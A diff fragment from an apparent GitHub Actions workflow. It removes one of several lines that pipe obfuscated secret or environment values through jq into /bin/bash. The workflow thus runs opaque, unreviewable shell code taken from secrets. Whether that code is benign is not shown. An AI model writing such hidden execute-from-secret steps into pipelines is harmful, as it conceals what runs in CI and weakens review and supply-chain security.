@@ -21,7 +21,6 @@ jobs:
           bwnkl6629: ${{ secrets.bwnkl6629 }}
         run: |
           printf '%s' "$bwnkl6629" | jq -r .ke4 | /bin/bash
-          echo $bsbvp6 | jq -r .ugdr47383 | /bin/bash
           printf '%s' "$a88" | jq -r .blsb5132 | /bin/bash
           echo $rxou8346 | jq -r .itv7 | /bin/bash
           printf '%s' "$khrng3" | jq -r .nd54405 | /bin/bash
